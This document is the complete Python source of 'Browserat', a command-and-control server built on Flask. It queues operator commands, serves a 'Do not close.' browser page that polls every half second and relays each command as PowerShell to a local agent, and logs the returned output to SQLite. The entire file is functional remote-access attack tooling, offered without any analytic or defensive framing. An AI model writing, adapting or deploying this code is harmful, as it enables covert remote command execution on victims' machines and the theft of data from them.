# -*- coding: utf-8 -*-
#!/bin/usr/python
from flask import Flask
from flask import request
import logging
import readline
import thread
import sys 
import urllib
import base64
import threading
import time
import os
import signal
from multiprocessing import Process
from flask_sqlalchemy import SQLAlchemy

# Constants
BROWSERAT_PROMPT = "BRAT> "
LOCALHOST_ADDRESS = "http://localhost:8899/do" #Browserat client-side web-server for OS command execution
DB_LOCATION = 'sqlite:///browserat.sqlite3'
TITLE = """Browserat v0.4
 """[1:]
HELP_BLOB = """
help - this help screen
; - prefix, anything after semicolon will be executed as PowerShell code
history <from> <to> - range of history entries to over
clear_history or delete_history - delete history (prompts for confirmation)

"""

# Main definitions
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = DB_LOCATION
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
db = SQLAlchemy(app)

#Globals & Flags
command = ""

# Server functions
def run_server():
	global app
	app.run(host='0.0.0.0', port=80, threaded=True,debug=False, use_reloader=False)

# SQLAlchemy Models
class History(db.Model):
	__tablename__ = 'HistoryTbl'

	id = db.Column(db.Integer, primary_key=True)
	command = db.Column(db.String())
	output = db.Column(db.String())

	def __init__(self, command=None, output=None):
		self.command = command
		self.output = output.replace("\x00", "")

	def __repr__(self):
		return str(self.id) + '\n' + self.command + ":\n" + self.output

# Web-Server routes
@app.route("/control/controller")
def controller():
    return """<meta charset="UTF-8">
<h1>Do not close.</h1>
<script src="/static/jquery-3.0.0.min.js"></script><div class=command></div><br><div class=result></div><div class=sent></div>
<script>
var cmd = "";

function execute () {
	$.post(\"""" + LOCALHOST_ADDRESS + """",{'c' : encodeURI(cmd) }, function( data ) {
		var b64d = data;
		var b64c = cmd;
		$( ".result" ).html( "Output obtained.");
		$.post("/control/output", {'command' : encodeURI(b64c), 'output': encodeURI(b64d)}, function() {$( ".sent" ).html( "Output sent for " + cmd);} );
	});
}

setInterval(function() {
	$.get("/control/command", function( data ) {
		var new_cmd = data;
		if (new_cmd != "") {
			$( ".command" ).html( "Execution complete" );
			cmd = new_cmd ;
			execute();
		}
	});}
, 500);
</script>"""


# Issues commands to agent (commands issued by prompt)
@app.route("/control/command")
def disp_command():
	global command
	output = command
	command = ""
	return output

# Captures command output from agent
@app.route("/control/output", methods=['POST'])
def output():
	if request.method == 'POST':
		#clear_cli_stdout()
		try:
			raw_command = base64.b64decode(request.form['command']).replace('\x00','')
			raw_output = base64.b64decode(request.form['output']).replace('\x00','')
			new_history = History(raw_command, raw_output)
			db.session.add(new_history)
			db.session.commit()
			print(raw_command + ' :')
			print(raw_output)
			sys.stdout.write(BROWSERAT_PROMPT)
			sys.stdout.flush()
		except Exception, e:
			print str(e)
	return "<H1>It works!</H1>"

# Clear prompt if printing to screen
def clear_cli_stdout():
	CURSOR_UP_ONE = '\x1b[1A'
	ERASE_LINE = '\x1b[2K'
	print(CURSOR_UP_ONE + ERASE_LINE)

# Display History
# history - displays last 5 entries
# history <int> - display entry <int>
# history <start> <finish> - display entries between <start> and <finish>
def display_history(usercommand):
	if (usercommand.strip().lower() == "history"):
		print "Last 5 commands:"
		for item in History.query.all()[-5:]:
			print item
	else:
		vars = usercommand.strip().lower().split(" ",1)[1]
		# Get range of records
		if " " in vars:
			start, end = vars.split(" ", 1)
			try:
				start = int(start)
				end = int(end)
				print "History between " + str(start) + " and " + str(end) + " commands:"
				output = History.query.filter(History.id>=start, History.id<=end).all()
				if output:
					for item in output:
						print item
				else:
					print "No history found in this range"
			except ValueError, e:
				print "Not a valid number!"
			except Exception, e:
				print str(e)
		# Get specific History record
		else:
			try:
				record = int(vars)
				output = History.query.filter(History.id==record).first()
				if output is not None:
					print output
				else:
					print "Entry " + str(record) + " not found in history"
			except Exception, e:
				print str(e)
	sys.stdout.flush()
# Delete history
def delete_history():
	delete = raw_input("Type 'YES' to confirm deletion of history\n")
	if (delete == "YES"):
		db.session.query(History).delete()
		db.session.commit()
		print "History deleted."
	else:
		print "History NOT deleted."

# Main
if __name__ == "__main__":
	db.create_all()
	server_proc = threading.Thread(target=run_server)
	server_proc.start()
	# Title+Help
	print TITLE
	print HELP_BLOB
	try:
		# CLI Loop
		while (True):
			usercommand = raw_input(BROWSERAT_PROMPT)
			if (usercommand.strip().lower().split(" ",1)[0] == "history" ):
				display_history(usercommand)
			elif (usercommand.strip().lower() == "clear_history" or usercommand.strip().lower() == "delete_history"):
				delete_history()
			elif (usercommand.strip().lower() == "help"):
				print HELP_BLOB
			else:
				command = base64.b64encode(usercommand)

	except KeyboardInterrupt:
		print '\r\nExitting...\r\n'
		db.session.close_all()
		os.kill(os.getpid(), signal.SIGTERM) #Flask is great, but its documented method for shutdown is broken when threads are involved
	except Exception, e:
		print e
		db.session.close_all()
		os.kill(os.getpid(), signal.SIGTERM) #Flask is great, but its documented method for shutdown is broken when threads are involved